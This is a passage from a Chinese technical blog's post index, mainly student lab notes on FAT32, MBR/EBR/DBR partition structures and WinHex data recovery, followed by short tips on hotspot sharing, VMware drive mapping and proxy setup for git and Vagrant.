<p>接下来在桌面上新建一个文件1.txt，将其拖入逻辑分区J（PS:不要在磁盘内右击新建，而是应该在桌面新建再拉进去）<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-4840b2b4fc90c591.png" alt="分区J.png"><br><strong>目的：找到分区4(fat32分区）的FAT1,2的起始扇区的位置和数据区的起始位置</strong><br>回顾上一期的内容<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-9c0041b0e4b11c7e.png" alt="FAT32文件系统主要结构.png"><br><strong>1.    保留区含有一个重要的数据结构———-系统引导扇区（DBR）。FAT12  FAT16的保留区通常只有一个扇区，而FAT32D 保留区要多一些，除0号扇区外，还有其他一些扇区，其中包括了DBR的备份扇区。<br>2.    FAT区由来是各个大小相等的FAT表组成——-FAT1  FAT2,FAT2紧跟在FAT1之后。<br>3.    FAT12 FAT16的根目录虽然也属于数据区，但是他们并不由簇进行管理，也就是说FAT12  FAT16的根目录使没有簇号的，他们的2号簇从根目录之后开始。而FAT32的根目录通常位于2号簇。</strong></p>
<p>FAT32的保留扇区数，比较常见的为<strong>32  34 38</strong>扇区</p>
<p><img src="/images/loading.gif" data-original="/posts/53072925/18457849-7d3c92c67735c9f8.png" alt="FAT32DBR.png"><br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-99543aa21fe47e1b.png" alt="上期知识点.jpg"><br><strong>数据区起始扇区号即是根目录扇区号</strong><br><strong>以上扇区均可在Winhex中直接点击分区内的各区域位置，但是此时下面对应的扇区均为相对偏移地址，在硬盘外查看要加上当前分区DBR的偏移地址</strong></p>
<p>于是第一个FAT表起始位置=352256+0026h=352294<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-5274a2a457f9c01d.png" alt="第一个FAT表.jpg"><br>第二个FAT表起始位置=352294+000001C9h=352751<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-ce23913228434727.png" alt="第二个FAT表.png"><br>可以看出FAT2和FAT1完全一样<br>因为FAT表很重要，于是微软为它做了备份FAT2<br>数据区起始位置=352751+000001C9h=353208<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-afaf0a0834c2173c.png" alt="数据区起始位置.jpg"><br>可以看到1 TXT文件名字样，这边属于数据区的根目录区<br>多向下滑几面，可以看到1.txt的文本内容<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-514c7f4185e20759.png" alt="文本内容.png"><br>保留扇区中DBR的下一个扇区是FSINFO扇区<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-17252fdfab8e362e.jpg" alt="FSINFO扇区.jpg"><br>在签名标志“rrAa”后<br><strong>1E8-1EB</strong>是表示<strong>空闲簇数</strong><br><strong>1EC-1EF</strong>是表示<strong>下个可用簇号</strong></p>
<h1 id="FAT表"><a href="#FAT表" class="headerlink" title="FAT表"></a>FAT表</h1><p><strong>FAT表中文名称是文件分配表，其作用是指向文件存储位置，接下来介绍它的结构</strong><br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-ba2c26be4019e348.png" alt="FAT表.png"><br>对于FAT32来说每4个字节算一个表项，其中：</p>
<p>0号表项，0x0<strong>F8FFFF0F</strong>是FAT表起始固定标识；<br>1号表项，0x0<strong>FFFFFFFF</strong>，系统默认占用，不使用，默认值；<br>2号表项，0x0<strong>FFFFFF0F</strong>，标识文件结束，表项对应2号簇，根目录所在簇。</p>
<p>每一个文件均存放在簇里<br>1）如果某个簇未被分配使用，它所对应的FAT表项内的FAT表项值即用<strong>0</strong>进行填充，表示该FAT表项所对应的簇未被分配。</p>
<p>2）当某个簇已被分配使用时，则它对应的FAT表项内的FAT表项值也就是该文件的下一个存储位置的簇号，如果该文件结束与该簇，则在它的FAT表项中记录的是一个文件结束标志，对于FAT32而言，代表文件结束的FAT表项值为<strong>0x0FFFFFFFF</strong>。</p>
<p>3）由于簇号起始于2号，所以FAT表项的0号表项与1号表项不与任何簇对应。FAT32的0号表项值总是“<strong>F8FFFF0F</strong>”</p>
<p>4）1号表项可能被用于记录<strong>脏标志</strong>，以说明<strong>文件系统没有被正常卸载或者磁盘表面存在错误</strong>。不过这个值并不重要。正常情况下1号表项的值为“<strong>FFFFFFFF</strong>”或者“<strong>FFFFFF0F</strong>”。</p>
<p>5）如果某个簇存在坏扇区，则整个簇会用FAT表项值0x<strong>FFFFFFF7</strong>标记为<strong>坏簇</strong>，不再使用，这个坏簇标记就记录在它所对应的FAT表项中。</p>
<p>6）在文件系统中新建文件时，如果新建的文件值占用一个簇，<strong>为其分配的簇对应的FAT表项中将会写入结束标记</strong>。如果新建的文件不止占用一个簇，则<strong>在其所占用的每个簇对应的FAT表项中写入为其分配的下一簇的簇号，在最后一个簇对应的FAT表项中写入结束标记</strong>。</p>
<p>7）新建目录时，只为其分配<strong>一个簇</strong>的空间，对应的FAT表项中写入<strong>结束标记</strong>。当目录增大超过一个簇的大小是，将会在<strong>空闲空间</strong>中为其分配一个簇，并在FAT表中为其建立<strong>FAT表链</strong>以描述它所占用簇情况。</p>
<p>8）对文件或目录进项操作时，它们所对应FAT表项将会被清空，设置为<strong>0</strong>以表示其所对应的簇处于未分配状态。</p>
<p>FAT表另一个作用是<strong>声明当前簇是否被占用</strong>，因为文件存储过程是在找未使用的簇，然后又填入（对于较大的文件，如果是找连续的簇空间存放，则之前那些未使用的簇将会被浪费掉），删除文件后根目录的文件名首字节会用<strong>E5标志</strong>替代表示该文件扇区，如果再往该文件所在簇空间写入数据，亦即被删除文件的数据没有被覆盖掉，被删除文件就可以恢复过来。<br><img src="/images/loading.gif" data-original="/posts/53072925/18457849-0fabddbbcd2a8dfa.png" alt="最后两行是被删除文件的目录项.png"></p>
<h1 id="目录项"><a href="#目录项" class="headerlink" title="目录项"></a>目录项</h1><p><img src="/images/loading.gif" data-original="/posts/53072925/18457849-e6c8fbc304454144.png" alt="目录项.png"><br>目录项中每两行划分为一个文件单位，</p>
<p>1）在第一行中，0到7字节是<strong>文件名</strong>，其中，对于短文件名（不超过8字节）而言，未用完的字节用0x<strong>20</strong>填充；对于长文件名而言，它在目录项只能显示<strong>6个字节</strong>，后面两个字节用“<strong>~1</strong>”进行系统填充，表示其为长文件名。</p>
<p>2）8 9 10字节是<strong>文件后缀名</strong>，只用三个字节存，这也就是为什么绝大多数文件后缀名均只有3个字节，如果文件后缀名超过三个字节，它在此处也只显示前三个字节的内容。</p>
<p>3）第11（B）字节是代表<strong>文件属性</strong>，这边有个有趣的属性标记方式，若此处字节为03，则文件属性为只读<strong>且</strong>隐藏（采用加法）。</p>
<p>4）13(D)字节是文件创建时间的10毫秒位<br>5）14(0xE) 15(0xF)是<strong>文件创建时间</strong> 0x10 0x11是<strong>文件创建日期</strong>，0x16 0x17是<strong>最近文件修改时间</strong> 0x18 0x19是<strong>最近文件修改日期</strong><br>如何查看时间呢？可以点击Winhex的选项中的数据解释器，将<strong>DOS Date+Time(32bit)</strong>后面勾上。就可以通过选中在数据解释器可以看到时间。</p>
<p>6）0x14 0x15是<strong>文件起始簇号的高16位</strong>，0x1A 0x1B是<strong>文件起始簇号的低16位</strong><br><strong>文件起始簇号</strong>=低16位的数值+（高16位的数字<strong>65536</strong>（0x10000））,通常高16位为00 00</p>
<p>7）0x1C 到0x1F是文件的大小（长度），单位是<strong>字节</strong>（Byte=8bits），但是对于<strong>文件夹</strong>而言，此处均是00 00 00 00（错误的数据）；同时，4个字节的存放位置决定了文件大小的上限为FF FF FF FF字节=4GB-1</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>修改引导启动分区位置</title>
    <url>/posts/a3e3f4d/</url>
    <content><![CDATA[<p>​         引导启动分区（即磁盘分区表DPT以80开头的分区表项），作为引导计算机启动的分区，一般默认第一分区为引导启动分区，那如何将第二分区作为启动分区呢？直接修改80位置？这是行不通的。<a id="more"></a></p>
<p>右键<strong>此电脑</strong>打开管理，点击磁盘管理，可以看到活动分区和主分区</p>
<p><img src="/images/loading.gif" data-original="/posts/a3e3f4d/18457849-bb52bfceb984a103.png" alt="活动分区.png"><br><img src="/images/loading.gif" data-original="/posts/a3e3f4d/18457849-4440d415bfb26543.png" alt="非活动分区.png"><br>右键磁盘I<br><img src="/images/loading.gif" data-original="/posts/a3e3f4d/18457849-20d490f1333073b7.png" alt="图标为灰色的.png"></p>
<p>遗憾的是，在某些电脑或者系统（包括我的）是不能修改活动分区位置的，图标<strong>将分区标记为活动分区(M)</strong>为灰色的。</p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>判断磁盘分区出问题的方法及恢复</title>
    <url>/posts/5d0a628f/</url>
    <content><![CDATA[<p>本文介绍如何用winhex查看磁盘分区的问题并将其修复。<a id="more"></a></p>
<p>用Winhex打开一个镜像文件（后缀名为.dd）,点击专业工具中的将镜像转化为磁盘<br><img src="/images/loading.gif" data-original="/posts/5d0a628f/18457849-db9b8fd0a2da207a.png" alt="打开镜像文件并将其转化为磁盘.png"></p>
<p><strong>有三种方法判断磁盘分区出问题的方法：</strong></p>
<p><strong>1）分区颜色为灰色，像是被锁定一样</strong><br><img src="/images/loading.gif" data-original="/posts/5d0a628f/18457849-bccb2a0eb32021b9.png" alt="分区2、3图标为灰色.png"><br><strong>2）点击15后的倒三角按钮可看到丢失</strong><br><img src="/images/loading.gif" data-original="/posts/5d0a628f/18457849-17cf337cdf3581af.png" alt="丢失.png"><br><strong>3）观察分区起始扇区</strong><br><img src="/images/loading.gif" data-original="/posts/5d0a628f/18457849-fe0547e563ae8b62.png" alt="可看到第2、3表项的起始扇区均异常.png"></p>
<p><strong>修复方法：</strong><br><strong>利用各分区表的数值关系，修正第2、3表项的起始扇区数值</strong><br>第二分区起始扇区=第一分区起始扇区+第一分区总扇区数<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;=00 00 00 3F+00 00 3E 82<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;=00 00 3E C1<br>第三分区起始扇区=第二分区起始扇区+第二分区总扇区数<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;=00 00 3E C1+00 00 3E C1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;=00 00 7D 82<br>按<strong>大头位序法（从右往左）</strong>填入即可<br>通过相机状的按钮进行磁盘快照（这个老是失效，我也不知道什么原因）或者关闭文件后再打开并转化为磁盘，可以发现磁盘修复成功！<br><img src="/images/loading.gif" data-original="/posts/5d0a628f/18457849-117b7a1380b9b894.png" alt="修复成功.png"></p>
]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>熟悉EBR、DBR分区表结构</title>
    <url>/posts/c5c6674d/</url>
    <content><![CDATA[<p>本实验是XMU网安系小学期电子数据擦除与恢复技术实验三，主要是学会看EBR和DBR分区表的结构。使用的软件有Winhex和DiskGenius。<a id="more"></a></p>
<h3 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><p>理解EBR、DBR在磁盘中的作用；<br>熟悉EBR、DBR分区表结构,能熟练找到磁盘中的EBR分区表。</p>
<h3 id="二、实验平台"><a href="#二、实验平台" class="headerlink" title="二、实验平台"></a>二、实验平台</h3><p> 操作系统：Windows X；<br>VHD虚拟磁盘</p>
<h3 id="三、实验要求"><a href="#三、实验要求" class="headerlink" title="三、实验要求"></a>三、实验要求</h3><ol>
<li>创建VHD虚拟磁盘；</li>
<li>创建虚拟磁盘500MB；</li>
<li>创建主分区80MB FAT32；</li>
<li>创建主分区100MB NTFS；</li>
<li>创建主分区50MB FAT32；</li>
<li>剩余空间创建扩展分区</li>
<li>创建逻辑分区90MB FAT32</li>
<li>创建逻辑分区110MB FAT32</li>
<li>剩余空间创建逻辑分区 FAT32</li>
<li>请找出以上分区的MBR、EBR、DBR所在的扇区,并在以下表格中标记出相关扇区数的十进制值</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:right">MBR</th>
<th style="text-align:right"></th>
<th style="text-align:right">文件系统类型</th>
<th style="text-align:right">EBR</th>
<th style="text-align:right">DBR</th>
<th style="text-align:right">扇区数</th>
<th style="text-align:right">保留扇区</th>
<th style="text-align:right">FAT表长度</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">主分区</td>
<td style="text-align:right">分区1</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">分区2</td>
<td style="text-align:right">NTFS</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">分区3</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right">扩展分区</td>
<td style="text-align:right">逻辑分区1</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">逻辑分区2</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">逻辑分区3</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
</tbody>
</table>
</div>
<h1 id="那就开始愉快地操作吧！"><a href="#那就开始愉快地操作吧！" class="headerlink" title="那就开始愉快地操作吧！"></a>那就开始愉快地操作吧！</h1><p>首先按要求创建VHD创建虚拟磁盘<br><strong>右键此电脑打开管理</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-a80ec10a973a527c.png" alt="1.png"><br><strong>打开磁盘管理，选择创建VHD</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-6cd233b455bdc607.png" alt="2.jpg"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-fb337a9fceba4ee1.png" alt="3.png"><br><strong>接着打开DiskGenius创建创建主分区80MB FAT32、100MB NTFS、50MB FAT32</strong><br>点击新建分区<br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-df3e08045b60f0e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-bb45284857df211e.png" alt="5.png"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-f2602c53f55880e2.png" alt="6.png"><br><strong>接着用剩余空间创建扩展分区</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-e376c380c9be33a2.png" alt="7.png"><br><strong>点击保存更改（一定要点）！全部点“是”“是”“是”【滑稽.jpg】</strong><br><strong>接着在扩展分区创建逻辑分区90MB FAT32、110MB FAT32,用剩余空间创建逻辑分区 FAT32</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-3b6deb569df97352.png" alt="8.png"><br>这边只能选择逻辑分区<br><strong>全部建完后保存更改！！！</strong><br>效果如下<br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-616e7a51e94bc451.png" alt="9.png"></p>
<h3 id="打开Winhex，点击工具，打开磁盘，打开已建立的虚拟磁盘"><a href="#打开Winhex，点击工具，打开磁盘，打开已建立的虚拟磁盘" class="headerlink" title="打开Winhex，点击工具，打开磁盘，打开已建立的虚拟磁盘"></a>打开Winhex，点击工具，打开磁盘，打开已建立的虚拟磁盘</h3><p>在扇区0可以看到整个磁盘的MBR(<strong>PS：MBR既可以指第一个扇区，又可以指第一个扇区的前446字节，要根据上下文分析</strong>）<br><em>补充知识</em><br><strong>MBR:又称主引导记录，位于0柱面0磁道1扇区，是整个磁盘的第一个扇区(一个扇区是512字节)，整个磁盘的第一个512字节，是【数据恢复的基础】<br>一个硬盘只有一个MBR，一个MBR对应三部分:<br>1、引导代码(MBR)：前446字(节无论是哪种系统，都差不多)<br>2、磁盘分区表(DPT): 64字节(80-55前之间，不同系统有区别)<br>3、2字节的结束标志: 55AA</strong><br>下图是第一分区表项的各项信息<br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-1458be69eed3151d.png" alt="分区表.png"></p>
<p>共16字节，80是引导标记符，<em>2 3 4字节是CHS起始寻址地址(无用)</em>，<strong>5字节是分区类型值(83 linux分区 07 NTFS)</strong>，<em>6 7 8字节是CHS寻址方式扇区总数(无用)</em> ,<strong>9 10 11 12字节是分区起始扇区数</strong> ,<strong>13 14 15 16字节是分区总扇区数</strong><br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-9777ee197ec4cad5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>可以看到2这一排对下来的0B 07 0B 05,分别表示FAT32 NTFS FAT32 扩展分区这四个分区， 然后可以看到9-12的各个分区的分区起始扇区，13-16是各个分区的分区总扇区数，（PS:选取数据要从右往左，采用大头位序法(数据的高位是放在内存的低位)），可以发现，第二个分区的起始扇区是第一个分区的起始扇区+第一个分区的分区总扇区数，其他分区亦是如此。<br><br><br><strong>由于硬盘仅仅为分区表保留了64个字节的存储空间，而每个分区的参数占据16个字节，故主引导扇区中总计只能存储4个分区的数据，最多只能建立四个分区！但是微软想到一个绝妙的方案，它让前三个分区都做主分区，后一个分区做扩展分区，然后可在扩展分区建新的逻辑分区，实现建立多个分区</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-37395d5a188f7845.png" alt="EBR.png"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-7324e494ff53e08f.png" alt="扩展分区结构.png"></p>
<p><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-896fba35f109103e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="EBR.png"><br><strong>EBR扇区和MBR非常类似，一个EBR扇区对应一个逻辑分区，其有用部分仅有其DPT(即64字节区)前两个表项，第一个表项表示本扩展分区(图中逻辑驱动器P)的起始地址和扇区数量，但是该地址为相对偏移，实际的起始扇区为本扇区的实际地址加上相对偏移量，这个起始扇区其实是第一个逻辑驱动器的DBR扇区，第二个表项记录了下一个扩展分区（逻辑驱动器Q）的EBR扇区的起始地址和扇区总数量。每个逻辑分区的DBR扇区(即用Winhex直接点击分区跳转到的扇区)之前都有一个EBR扇区，对于最后一个扇区，其EBR仅有第一表项，因为它没有后继EBR扇区，也就没有所谓的第二表项。<br>各个逻辑分区用类似链表的EBR扇区链接起来，不受四个分区表项的限制，因此可以创建超过四个的(逻辑)磁盘分区。</strong></p>
<h1 id="寻找逻辑分区EBR的方法："><a href="#寻找逻辑分区EBR的方法：" class="headerlink" title="寻找逻辑分区EBR的方法："></a>寻找逻辑分区EBR的方法：</h1><p><strong>1）利用计算公式，在MBR分区表找到扩展分区的起始扇区，这个起始扇区就是第一个扩展分区的EBR所在扇区，每个EBR均有也仅有两个有效表项，上面有提到，第二个表项记录着下一个EBR的起始位置，但是该位置是相对偏移地址，需要加上当前EBR所在扇区方可的到下一个EBR的起始扇区，以此类推。<br>2）在上课做上机实验时，我突然发现邻座同学填EBR所在扇区位置很快，原来EBR位置是可以直接查看的！<br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-f7a350cc84fba5c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="分区间隙.png"><br>注意Winhex这个大小为分区间隙，其实这个分区间隙的第一个扇区就是EBR所在扇区。其地址可以通过点击分区间隙通过左下角扇区位置查看，也可以直接看分区间隙后的链接地址。</strong></p>
<p>MBR最大可以识别最大2TB的分区，GPT可以识别最大256TB的分区</p>
<h5 id="接下来看文件系统结构"><a href="#接下来看文件系统结构" class="headerlink" title="接下来看文件系统结构"></a>接下来看文件系统结构</h5><p><strong>对于文件系统，用扇区这个最小单位来衡量已经过于庞大，而是用簇来衡量，文件系统的最小单位是簇。<br>扇区:是硬盘的最小单位<br>簇:是文件系统的最小单位</strong><br><strong>若簇的大小是4kb=4096字节=8个扇区（不同文件不一定一样）<br>18kb的文件要5个簇存</strong><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-e8c70db2f22f2a3f.png" alt="16.png"><br><strong>文件残留区:删除文本后剩下的空间</strong><br>由上图可以看到，虽然只有3字节，但是却占用4kb的空间，除3kb外剩余的空间被称为<strong>文件残留区</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-03739599abdb5b9d.png" alt="FAT32文件系统主要结构.png"></p>
<p><strong>上图FAT表作用:指向文件存储位置，fat32有两个完全相同的FAT表（另一个作为副本）</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-f32a977170fb1964.png" alt="FAT32DBR.png"></p>
<p><strong>DBR只看前三行：<br>1）在DBR前有三个字节代表文件系统跳转指令：<br>&emsp;&emsp;FAT32文件系统跳转指令:EB 58 90<br>&emsp;&emsp;FAT16文件系统跳转指令:EB 3C 90<br>&emsp;&emsp;NTFS 文件系统跳转指令:EB 52 90<br>&emsp;&emsp;exfat 文件系统跳转指令:EB 76 90<br>2）各结构联系<br>第一个FAT表起始位置=当前位置+FAT表前保留扇区数<br>第二个起始位置=第一个+每个FAT表扇区数<br>数据区起始位置=第二个+每个FAT表扇区数<br>3）文件系统总扇区数<br>由上图可知是4个字节，由此可知其最大可有FF FF FF FFh个扇区=fffffffh$\times$512字节=2047GB&lt;2TB，所以fat32文件系统最大容量不可超过2TB</strong><br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-b714b59635429a64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="FAT表.png"></p>
<h2 id="熟悉以上内容于是我们可以开始愉快地填表啦"><a href="#熟悉以上内容于是我们可以开始愉快地填表啦" class="headerlink" title="熟悉以上内容于是我们可以开始愉快地填表啦"></a>熟悉以上内容于是我们可以开始愉快地填表啦</h2><p><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-8fe3f82236f6587e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-ff9e9ae9094b910c.png" alt="18.png"><br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-9ab82496b8911fb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br><img src="/images/loading.gif" data-original="/posts/c5c6674d/18457849-410b62a022474996.png" alt="20.png"><br><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-c30f04298ba83370.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"></p>
<p><img src="/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/18457849-df54b69ec8740ca6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:right">MBR</th>
<th style="text-align:right"></th>
<th style="text-align:right">文件系统类型</th>
<th style="text-align:right">EBR</th>
<th style="text-align:right">DBR</th>
<th style="text-align:right">扇区数</th>
<th style="text-align:right">FAT表前保留扇区数</th>
<th style="text-align:right">FAT表长度（字节数）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">主分区</td>
<td style="text-align:right">分区1</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right">无</td>
<td style="text-align:right">2048</td>
<td style="text-align:right">00028000h=$80*2^{11}$</td>
<td style="text-align:right">38</td>
<td style="text-align:right">027Bh*512=325120</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">分区2</td>
<td style="text-align:right">NTFS</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">分区3</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right">扩展分区</td>
<td style="text-align:right">逻辑分区1</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right">473088</td>
<td style="text-align:right">475136</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">逻辑分区2</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right">逻辑分区3</td>
<td style="text-align:right">FAT32</td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
</tr>
</tbody>
</table>
</div>
<p><strong>填了一个，剩下自己填吧。。。</strong></p>
<h1 id="【明】"><a href="#【明】" class="headerlink" title="【明】"></a>【明】</h1>]]></content>
      <categories>
        <category>电子数据擦除与恢复技术</category>
      </categories>
  </entry>
  <entry>
    <title>笔记本开热点手机连不上的原因</title>
    <url>/posts/dfe52f55/</url>
    <content><![CDATA[<p>笔记本开热点借用的是<strong>本地连接</strong>的网络，因此要到笔记本所使用的网络接口设置共享，如笔者使用的是WLAN，到更改适配器界面设置共享即可！<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/dfe52f55/18457849-1c88b92d50d330d5.png" alt="图片.png"><br>如果使用网线的话，到以太网设置共享即可<br>对于网络共享<br>树莓派如果用网线连接笔记本，要为<strong>以太网</strong>设置共享</p>
]]></content>
      <categories>
        <category>BUG</category>
      </categories>
      <tags>
        <tag>window技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware映射虚拟磁盘提示Z:\不可用,如果该位置位于...的解决方法</title>
    <url>/posts/a9ec91c3/</url>
    <content><![CDATA[<p>​         出现Z:\不可用。如果该位置位于这台电脑上，请确保设备或驱动器已连接，或者光盘已插入，然后重试。如果该位置位于网络上，请确保你已连接到网络或Internet，然后重试。如果仍然找不到该位置，则它可能已移动或删除。<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/a9ec91c3/18457849-3a36923ed48b34a6.png" alt></p>
<p>​         开始——运行，输入：gpedit.msc回车，双击本地计算机策略的【windows设置】——安全设置——本地策略——安全选项—双击【用户账户控制：以管理员批准模式运行所有管理员】，点击禁用，重启</p>
]]></content>
      <categories>
        <category>BUG</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>Vagrant利用ss加速下载</title>
    <url>/posts/6e90a67c/</url>
    <content><![CDATA[<p>Vagrant 利用ss加速下载，会出现如下情况<br><img src="/images/loading.gif" data-original="/posts/6e90a67c/18457849-619c394b2e354d5b.png" alt><br>此时我们需先配置命令行代理<a id="more"></a></p>
<ul>
<li>CMD 内<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">set http_proxy&#x3D;127.0.0.1:1080</span><br><span class="line">set https_proxy&#x3D;127.0.0.1:1080</span><br></pre></td></tr></table></figure></div>
补充一下，一定要用cmd命令行，别用powershell，否则无效。另外，测试是否成功用curl <a href="https://www.google.com">https://www.google.com</a>, 别用ping。(1080是默认端口号）</li>
<li>git 内<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure></div>
<img src="/images/loading.gif" data-original="/posts/6e90a67c/18457849-60dc892df48fcd59.png" alt><br>下载成功<br>同时解决vagrant up慢的问题<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vagrant plugin install vagrant-proxyconf</span><br></pre></td></tr></table></figure></div>
然后编辑相关项目的Vagrantfile<br><img src="/images/loading.gif" data-original="/posts/6e90a67c/18457849-de0cf5f424cdf0de.png" alt="Vagrant"><br><img src="/images/loading.gif" data-original="/posts/6e90a67c/18457849-422daed6cac8d8cd.png" alt="图片.png"><br>保存即可<br>重新运行Vagrant up<br>参考链接<a href="https://learnku.com/articles/34949">https://learnku.com/articles/34949</a></li>
</ul>
]]></content>
      <categories>
        <category>资源分享</category>
      </categories>
      <tags>
        <tag>Vagrant</tag>
      </tags>
  </entry>
  <entry>
    <title>Window查看电池损耗</title>
    <url>/posts/7bf2a20c/</url>
